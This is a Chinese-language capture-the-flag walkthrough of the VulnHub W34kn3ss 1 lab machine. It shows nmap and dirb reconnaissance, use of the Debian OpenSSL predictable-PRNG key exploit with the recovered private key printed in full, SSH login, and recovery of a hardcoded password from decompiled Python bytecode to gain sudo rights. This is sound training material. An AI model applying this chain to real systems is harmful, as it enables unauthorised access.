# W34kn3ss 1

> https://download.vulnhub.com/w34kn3ss/W34KN3SS.ova

靶场IP：`192.168.32.13`

扫描对外端口服务

```
┌──(root㉿kali)-[~]
└─# nmap -sV -p1-65535 192.168.32.13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 21:47 EDT
Nmap scan report for 192.168.32.13
Host is up (0.00015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 08:00:27:66:B1:7A (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.74 seconds

```

访问80端口

![image-20220909094915952](../../.gitbook/assets/image-20220909094915952.png)

爆破目录

```
┌──(root㉿kali)-[~]
└─# dirb http://192.168.32.13/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  8 21:49:19 2022
URL_BASE: http://192.168.32.13/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.32.13/ ----
==> DIRECTORY: http://192.168.32.13/blog/                                                                                                                                                                                                 
+ http://192.168.32.13/index.html (CODE:200|SIZE:10918)                                                                                                                                                                                   
+ http://192.168.32.13/server-status (CODE:403|SIZE:301)                                                                                                                                                                                  
==> DIRECTORY: http://192.168.32.13/test/                                                                                                                                                                                                 
==> DIRECTORY: http://192.168.32.13/uploads/                                                                                                                                                                                              
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.13/blog/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.13/test/ ----
+ http://192.168.32.13/test/index.html (CODE:200|SIZE:72)                                                                                                                                                                                 
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.13/uploads/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Sep  8 21:49:23 2022
DOWNLOADED: 9224 - FOUND: 3

```

逐一查看这些目录，没有看到有用的东西。

![QQ录屏20220909095520](../../.gitbook/assets/QQ录屏20220909095520.gif)

查看证书，发现一个域名，做本地hosts

```
192.168.32.13 weakness.jth
```

![image-20220909100102248](../../.gitbook/assets/image-20220909100102248.png)

访问域名出现小兔子

![image-20220909100344657](../../.gitbook/assets/image-20220909100344657.png)

重新爆破目录

```
┌──(root㉿kali)-[~]
└─# dirb http://weakness.jth/  

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  8 22:04:09 2022
URL_BASE: http://weakness.jth/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://weakness.jth/ ----
+ http://weakness.jth/index.html (CODE:200|SIZE:526)                                                                                                                                                                                      
==> DIRECTORY: http://weakness.jth/private/                                                                                                                                                                                               
+ http://weakness.jth/robots.txt (CODE:200|SIZE:14)                                                                                                                                                                                       
+ http://weakness.jth/server-status (CODE:403|SIZE:300)                                                                                                                                                                                   
                                                                                                                                                                                                                                          
---- Entering directory: http://weakness.jth/private/ ----
==> DIRECTORY: http://weakness.jth/private/assets/                                                                                                                                                                                        
==> DIRECTORY: http://weakness.jth/private/files/                                                                                                                                                                                         
+ http://weakness.jth/private/index.html (CODE:200|SIZE:989)                                                                                                                                                                              
                                                                                                                                                                                                                                          
---- Entering directory: http://weakness.jth/private/assets/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                                                                                                          
---- Entering directory: http://weakness.jth/private/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Thu Sep  8 22:04:13 2022
DOWNLOADED: 9224 - FOUND: 4

```

下载`mykey.pub`

![image-20220909100507567](../../.gitbook/assets/image-20220909100507567.png)

```
┌──(root㉿kali)-[~]
└─# curl http://weakness.jth/private/files/notes.txt
this key was generated by openssl 0.9.8c-1
                                            
```

```
┌──(root㉿kali)-[~/Downloads]
└─# cat mykey.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
```

查找漏洞

```
┌──(root㉿kali)-[~/Downloads]
└─# searchsploit  0.9.8c-1
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH                                                                                                                  | linux/remote/5622.txt
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH                                                                                                                  | linux/remote/5720.py
OpenSSL 0.9.8c-1 < 0.9.8g-9 (Debian and Derivatives) - Predictable PRNG Brute Force SSH (Ruby)                                                                                                           | linux/remote/5632.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

下载exp

```
cd /tmp
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/5622.tar.bz2
tar -xvf 5622.tar.bz2
```

搜索私钥

```
┌──(root㉿kali)-[/tmp/rsa]
└─# grep -r "$(cat /tmp/mykey.pub)" * 
2048/4161de56829de2fe64b9055711f531c1-2537.pub:ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
```

```
┌──(root㉿kali)-[/tmp/rsa]
└─# cat 2048/4161de56829de2fe64b9055711f531c1-2537.pub          
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguAeWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnskJJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yczZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4Iklgw== root@targetcluster
```

```
┌──(root㉿kali)-[/tmp/rsa]
└─# cat 2048/4161de56829de2fe64b9055711f531c1-2537    
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEApC39uhie9gZahjiiMo+k8DOqKLujcZMN1bESzSLT8H5jRGj8
n1FFqjJw27Nu5JYTI73Szhg/uoeMOfECHNzGj7GtoMqwh38clgVjQ7Qzb47/kguA
eWMUcUHrCBz9KsN+7eNTb5cfu0O0QgY+DoLxuwfVufRVNcvaNyo0VS1dAJWgDnsk
JJRD+46RlkUyVNhwegA0QRj9Salmpssp+z5wq7KBPL1S982QwkdhyvKg3dMy29j/
C5sIIqM/mlqilhuidwo1ozjQlU2+yAVo5XrWDo0qVzzxsnTxB5JAfF7ifoDZp2yc
zZg+ZavtmfItQt1Vac1vSuBPCpTqkjE/4IklgwIBIwKCAQAEsNtdFqV0vlpbmzfV
jxNXUe7rOI+kKMXhiLdk8l3Tq9bzU3Tum+wMLVOugXgyarAW9suCOzUFVFR2rx1R
SCLuKaXgBcqHh0n1qGHr/dWVeR0+r98ZaTsZLcTi+YOTge2vBn66C6HSJoF+OrFQ
3yt6X08/08frmBwtdjwCbwKoPr5VXe1od0wfzuRmohUa/25hVUvUUIgv7IfrURda
x5CbJNz/iqZ/2dE3Xz20sw/eoP3us9YjykPozy71DH9qOs/d1mtXOL/Yi26lZeZY
SxBwBy8Ubqj6+pmjeHovMyHviPSSNaIk5YR0AP/fmRkR0PgcUAh1HiwhwjecHR3J
w7ojAoGBANXMB3x8/WB+6YyvZrTEPDXv9y4uc22xPwCbMie12wlQdLvTGEPZfpa+
Y/TtW5Sk7rCbu42SLsg7CZ4wPBv2M5F0EJEjs74vjmxe5RQCysQrHWGdzjKE1W2K
TDmaVs+P04jKKsiQ0wgLQLWOWJOY+z8nM2SYnn6bSN7xg4KXQszdAoGBAMSWnDJf
R3sjW8retZrfsCM7X6gLovELE9DfgtDcGqIlM455sEujh19x3f0pG+DI4cqdhyqU
xPcTRjXpaRsZ3aWuqPeSwtfKrzHMMdbQbNKSdFjuTaTdXIIjzVJuCm8u8+Df7Kkx
ZBp+SDx5qyw6UCpjqOKvIcfRvnFIsqqzg+XfAoGAElNRGUyKvyDSMKFR8jy0tCqC
5rOGPJop+LzYac3CUUFpF2ndgiiV0mgXMkA7DL2uDyNKlxsolNHcQMJOS4ohrWG4
RvRufgQThaG73STPjShEWNMDC6T8WdincqbUPa0+BGkZnCmrsDt6kzgWOIl0nwNc
LTGnL2xlVPAhNxRHjecCgYEAgS/FurOkAHZSQ3xotjs5O7lNfQ72DB046FhdR2wR
gH7YvLZd6JAIgIyn0j+V+h2bsQhuxDXghRtLZUGc10uDBnoXQ5r1EXaQYo1/1k5z
Zc30r3gHIzJhXNWyz8SnxWf/WUKxdn+K7Nakf4MnV5QIy2YP5WvFvdL5faTNLli1
wvECgYEAtJjIJgr7lC0dNwdgW/31+mcKUC4qNc8GWYrPKx5/YkIGqjv3K0uT36km
5CmQoO3IulZH8TK58uby9N5NkdInN+xd4fXzIjZDpDIieRyZfLZ7fSIlIfGgZUmW
zOWOYqKscA/54PD9LjM5rdciFf3WiokmnTqHXFiBAWcSSoNu8vI=
-----END RSA PRIVATE KEY-----
```

使用私钥登录root用户，发现失败

```
┌──(root㉿kali)-[/tmp/rsa]
└─# cp 2048/4161de56829de2fe64b9055711f531c1-2537 /tmp/id_rsa                                  
                                                                                                          
┌──(root㉿kali)-[/tmp/rsa]
└─# cd /tmp                                                  
                                                                                                          
┌──(root㉿kali)-[/tmp]
└─# chmod 600 id_rsa 
                                                                                                          
┌──(root㉿kali)-[/tmp]
└─# ssh -i id_rsa root@192.168.32.13
Warning: Identity file id_ras not accessible: No such file or directory.
The authenticity of host '192.168.32.13 (192.168.32.13)' can't be established.
ED25519 key fingerprint is SHA256:koRv88cs7rOaN5gXpbG8ZFyWenXutBQYShsmx5Gnu0I.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.32.13' (ED25519) to the list of known hosts.
root@192.168.32.13's password: 
Permission denied, please try again.
```

查看证书，找到一个用户名：`n30`

![image-20220909102217296](../../.gitbook/assets/image-20220909102217296.png)

登录成功

```
┌──(root㉿kali)-[/tmp]
└─# ssh -i id_rsa n30@192.168.32.13
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Tue Aug 14 13:29:20 2018 from 192.168.209.1
n30@W34KN3SS:~$ 
```

没有sudo列表

```
n30@W34KN3SS:~$ sudo -l
[sudo] password for n30: 
```

执行code

```
n30@W34KN3SS:~$ file code 
code: python 2.7 byte-compiled

n30@W34KN3SS:~$ python code
[+]System Started at : Fri Sep  9 05:25:54 2022
[+]This binary should generate unique hash for the hardcoded login info
[+]Generating the hash ..
[+]Your new hash is : e50dc4de8bfd546a9e5dd59150672ebd974826cf22c753fddc0fa8fc5171a668
[+]Done

```

下载code到本地

```
┌──(root㉿kali)-[/tmp]
└─# scp -i id_rsa n30@weakness.jth:/home/n30/code ./code
The authenticity of host 'weakness.jth (192.168.32.13)' can't be established.
ED25519 key fingerprint is SHA256:koRv88cs7rOaN5gXpbG8ZFyWenXutBQYShsmx5Gnu0I.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:10: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'weakness.jth' (ED25519) to the list of known hosts.
code                                                                              100% 1138   526.0KB/s   00:00    
            
```

安装`uncompyle6`

```
pip3 install uncompyle6
```

逆向pyc

```
┌──(root㉿kali)-[/tmp]
└─# mv code code.pyc
                                                                                                                    
┌──(root㉿kali)-[/tmp]
└─# uncompyle6 code.pyc
# uncompyle6 version 3.8.0
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.10.4 (main, Mar 24 2022, 13:07:27) [GCC 11.2.0]
# Embedded file name: code.py
# Compiled at: 2018-05-08 11:50:54
import os, socket, time, hashlib
print ('[+]System Started at : {0}').format(time.ctime())
print '[+]This binary should generate unique hash for the hardcoded login info'
print '[+]Generating the hash ..'
inf = ''
inf += chr(ord('n'))
inf += chr(ord('3'))
inf += chr(ord('0'))
inf += chr(ord(':'))
inf += chr(ord('d'))
inf += chr(ord('M'))
inf += chr(ord('A'))
inf += chr(ord('S'))
inf += chr(ord('D'))
inf += chr(ord('N'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('B'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('!'))
inf += chr(ord('#'))
inf += chr(ord('3'))
inf += chr(ord('3'))
hashf = hashlib.sha256(inf + time.ctime()).hexdigest()
print ('[+]Your new hash is : {0}').format(hashf)
print '[+]Done'
# okay decompiling code.pyc

```

找到n30密码

```
n30:dMASDNB!!#B!#!#33
```

![image-20220909103402778](../../.gitbook/assets/image-20220909103402778.png)

sudo

```
n30@W34KN3SS:~$ sudo -l
Matching Defaults entries for n30 on W34KN3SS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n30 may run the following commands on W34KN3SS:
    (ALL : ALL) ALL

```

![image-20220909103525585](../../.gitbook/assets/image-20220909103525585.png)
